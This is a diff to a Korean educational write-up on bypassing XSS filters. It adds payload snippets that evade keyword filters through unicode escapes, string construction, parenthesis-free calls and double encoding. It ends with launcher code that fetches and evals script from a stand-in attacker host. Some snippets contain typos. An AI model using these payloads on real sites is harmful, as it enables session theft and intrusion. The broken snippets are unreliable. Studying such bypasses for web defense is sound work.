@@ -103,7 +103,7 @@ XSS 키워드를 필터링할 때 의심되는 구문을 거부하는 대신, �
 
 <br>
 
-HTML 마크업에서 `javascript:` 스키마는 URL 로드 시 자바스킯트 코드를 실행할 수 있도록 하는데, `a`태그나 `iframe`태그 등에 사용할 수 있다.  
+HTML 마크업에서 `javascript:` 스키마는 URL 로드 시 자바스크립트 코드를 실행할 수 있도록 하는데, `a`태그나 `iframe`태그 등에 사용할 수 있다.  
 
 <br>
 
@@ -115,17 +115,17 @@ HTML 마크업에서 `javascript:` 스키마는 URL 로드 시 자바스킯트 �
 
 <br>
 
-이런 방법때문에, `javascript:`스키마를 사용하짐지 못하도록 필터링하는 경우가 있는데, 이 경우에는 브라우저들이 URL을 사용할 떄 거치는 과정 중 하나인 정규화(Normalization)을 이용해 우회할 수 있다.
+이런 방법때문에, `javascript:`스키마를 사용하지 못하도록 필터링하는 경우가 있는데, 이 경우에는 브라우저들이 URL을 사용할 떄 거치는 과정 중 하나인 정규화(Normalization)을 이용해 우회할 수 있다.
 
 <br>
 
 ```html
-<a href="\1\4jAVasC\triPT:alert(document.domain)">Click me!</a>
+<a href="\1\4jAVasC\riPT:alert(document.domain)">Click me!</a>
 ```
 
 <br>
 
-또, HTML 태그의 속성 중 HTML Entity Encoding을 사용할 수 있는데 이를 이용해 `javscript:`스키마나 이 외의 XSS 키워드를 인코딩하여 필터링을 우회하는 방법도 있다.
+또, HTML 태그의 속성 중 HTML Entity Encoding을 사용할 수 있는데 이를 이용해 `javascript:`스키마나 이 외의 XSS 키워드를 인코딩하여 필터링을 우회하는 방법도 있다.
 
 <br>
 
@@ -176,4 +176,248 @@ HTML 내엔 다양한 종류의 태그와 속성이 존재하는데, 즉 XSS 공
 <iframe src="javascript:alert(parent.document.domain)">
 
 <iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
+```
+
+<br><br>
+
+### **자바스크립트 함수 및 키워드 필터링**
+
+<br>
+
+자바스크립트는 `Unicode escape sequence`를 지원하는데, `Unicode escape sequence`는 `"\uAC00" == "가"` 처럼 문자열에서 유니코드 문자를 코드포인트로 나타낼 수 있는 표기법이다.  
+
+<br>
+
+이를 이용해 필터링 된 문자열을 Unicode escape sequence로 변환해 우회하는 것이 가능하다.
+
+<br>
+
+```js
+var foo = "\u0063ookie"; // cookie
+var bar = "cooki\x65"; // cookie
+\u0061lert(document.cookie);
+```
+
+<br>
+
+다음으로, js는 `Computed member access`를 지원하는데 `Couputed member access`는 아래와 같이 객체의 특정 속성에 접근할 떄 속성 이름을 동적으로 계산하는 기능이다.
+
+<br>
+
+```js
+document["coo"+"kie"] == document["cookie"] == document.cookie
+```
+
+<br>
+
+```js
+alert(document["\u063ook"+"ie"]); // alert(document.cookie)
+
+window['al\x65rt'](document["\u0063ook" + "ie"]); // alert(document.cookie)
+```
+
+<br>
+
+XSS 공격 구문의 js 키워드를 필터링할 경우 아래와 같이 우회할 수 있다.
+
+<br>
+
+|구문|대체 구문|
+|:---:|:---:|
+|`alert`, `XMLHttpRequest`등 문서 최상위 객체 함수|`window['al'+'ert"]`, `widnow['XMLHtt'+'pRequest']` 등 이름 끊어서 쓰기|
+|`window`|`self`,`this`|
+|`eval(code)`|`FUnction(code)()|
+|`Function`|`isNan['contr'+uctor']` 등 함수의 `constructor`속성 접근|
+
+<br>
+
+또한, js의 언어적 특성을 활용 시 6개의 문자(`[`,`]`,`(`,`)`,`!`,`+`)로만 모든 동작을 수행할 수 있는데, 이 기법은 기존의 xss필터링에서 주로 탐지하는 단어들(script,cookie...)들을 언급하지 않아도 되서 많이 활용되고, 대신 XSS 공격 구문의 길이가 늘어난다.
+
+<br>
+
+#### **문자열 선언**
+
+<br>
+
+문자열을 사용할 때 따옴표(`"`,`'`)가 필터링되어 있을 시 `Template Literals`를 이용해 우회할 수 있는데, 템플릿 리터럴은 내장된 표현식을 허용하는 문자열 리터럴로 여러 줄로 이루어진 문자열과 문자를 보관하기 위한 기능이다.
+
+<br>
+
+템플릿 리터럴은 백틱(``\``)을 이용해 선언할 수 있으며 내장된 `${}`표현식을 이용해 다른 변수나 식을 활용할 수 있다.
+
+<br>
+
+```js
+var foo = "Hello";
+var bar = "world!";
+
+var baz = `${foo}, ${bar} ${1+1}.`; // Hello, \nworld 2.
+```
+
+<br>
+
+따옴표와 백틱 모두 사용하지 못할 시 아래와 같이 문자열을 만들 수 있다.
+
+<br>
+
+#### **RegExp 객체 사용**
+
+<br>
+
+`/Hello World/` 형태로 RegExp 객체를 생성하고 객체의 패턴 부분을 가져옴으로써 문자열을 만들 수 있다.
+
+<br>
+
+```js
+var foo = /Hello World!/.source; // "Hello world!"
+var bar = /test !/ + []; // "/test !/"
+```
+
+<br>
+
+#### **String.fromCharCode 함수 사용**
+`String.fromCharCode` 함수는 유니코드의 범위 중 파라미터로 전달된 수에 해당하는 문자를 반환한다.
+
+<br>
+
+```js
+var foo = String.fromCharCode(72, 101, 108, 108, 111); // "Hello"
+```
+
+<br>
+
+#### **기본 내장 함수나 객체의 문자를 사용하는 방법**
+<br>
+
+내장 함수나 객체를 `toString` 함수를 이용해 문자열로 변경할 시 함수나 객체의 형태가 문자열로 변환되는데, 원하는 문자열을 만드는데 필요한 문자들을 내장 함수나 객체로부터 한 글자씩 가져와 문자열을 만들 수 있다.
+
+<br>
+
+```js
+var baz = history.toString()[8] + // 'H'
+(history+[])[9] // 'i'
+(URL+0)[12] + // '('
+(URL+0)[13]; // ')' ==> "Hi()"
+```
+
+<br>
+
+#### **숫자 객체의 진법 변환**
+
+<br>
+
+10진수 숫자를 36진수로 변경하여 아스키 영어 소문자 범위를 모두 생성할 수 있는데, 이때 사용되는 연산자로 `E4X 연산자("..")`가 존재한다. 주로 점 두개를 쓰거나, 소수점으로 인식되지 않도록 공백과 점을 조합해 사용할 수 있다.
+
+<br>
+
+```js
+var foo = 29234652..toString(36); // "hello"
+var bar = 29234652.toString(36); // "hello"
+```
+
+<br>
+
+#### **함수 호출**
+
+<br>
+
+js의 함수를 호출하기 위해선 소괄호(Parentheses,`()`)나 Tagged Templates(백틱, ``\```)를 사용해야 한다.
+
+<br>
+
+```js
+alert(1); // Parentheses
+alert`1`; // Tagged Templates
+```
+
+<br>
+
+만약 소괄호, 백틱이 모두 필터링 될 시 아래와 같은 방법들을 사용할 수 있다.
+
+<br>
+
+#### **javascript 스키마를 이용한 location 변경**
+
+<br>
+
+`javascript:` 스키마를 이용할 시 URL을 이용해 js코드를 실행시킬 수 있는데, 이를 이용해 현재 `location` 객체를 변조하는 방식으로 js 코드를 실행할 수 있다.
+
+<br>
+
+```js
+location = "javascript:alert\x28document.domain\x29";
+location.href = "javascript:alert\u0028document.domain\u0029";
+location['href'] = "javascript:alert\050document.domain\051";
+```
+
+<br>
+
+#### **Symbol.haslnstance 오버라이딩**
+
+<bbr>
+
+js에는 문자열 이외에도 ECMAScript 6에서 추가된 Symbol 또한 속성 명칭으로 사용될 수 있다.
+
+<br>
+
+`Symbol.hasInstance` Well-known symbol을 이용하면 `instanceof` 연산자를 오버로이드 할 수 있는데, 즉 `O instanceof C`를 연산할 때 `C`에 `Symbol.hasInstance` 속성에 함수가 있을 경우 메소드로 호출하여 `instanceof` 연산자의 결과 값으로 사용하게 되는데, 이 특성을 이용해 `instanceof`를 연산하게 되면 실제 인스턴스 체크 대신 원하는 함수를 메소드로 호출되도록 할 수 있다.
+
+```js
+"alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
+Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
+```
+
+<br>
+
+#### **document.body.innerHTML 추가**
+
+<br>
+
+js는 문서 내에 새로운 HTMㅣ 코드를 추가하는 것이 가능한데, `document.body.innerHTML`에 코드를 추가할 경우 새로운 HTMl 코드가 문서에 추가되고 이를 이용해 js 코드를 실행시킬 수 있다.
+
+<br>
+
+이 때 주의할 점은 `innerHTML`으로 HTML 코드를 실행할 땐 보안 상 `<script>` 태그를 삽입해도 실행되지 않아서 이벤트 핸들러를 이용해 js코드를 실행해야 한다.
+
+<br>
+
+```js
+document.body.innerHTML+="<img src=x:onerror=alert#$40;1#$41;>"
+document.body.innerHTML+="<body src=x:onload=alert#$40;1#$41;>"
+```
+
+<br><br>
+
+### **디코딩 전 필터링 (Double encoding...)**
+
+<br>
+
+원래 입력 검증은 디코딩 등의 모든 전처리 작업이 끝나고 수행해야 하지만, 일부 웹은 데이터의 개별 요소를 추출하기 전에 전체 데이터에 필터링을 수행하는 경우가 있다.
+
+<br>
+
+예를 들어, 웹 방화벽을 사용하는 웹에서 double encoding을 수행할 때 한 번만 필터링을 할 시 `%253E` -> `%3E` -> `<` 식으로 필터링이 무용지물이 된다.
+
+<br>
+
+불필요한 인코딩을 줄이고, 웹에서 사용되는 인코딩 방식을 통일하는 방법으로 디코딩 전 필터링 취약점을 줄일 수 있다.
+
+<br><br>
+
+### **길이 제한**
+
+<br>
+
+삽입할 수 있는 코드의 길이가 제한되어 있는 경우, 다른 경로로 실행할 추가적인 코드(payload)를 URL fragment 등으로 삽입 후 삽입 지점에는 본 코드를 실행하는 짧은 코드(launcher)를 사용할 수 있다.
+
+<br>
+
+```js
+import("http://malice.dreamhack.io");
+
+var e = document.createElement('script');
+e.src = 'http://malice.dreamhack.io';
+document.appendChild(e);
+
+fetch('http://malice.dreamhack.io').then(x=>e val(x.text()))
 ```
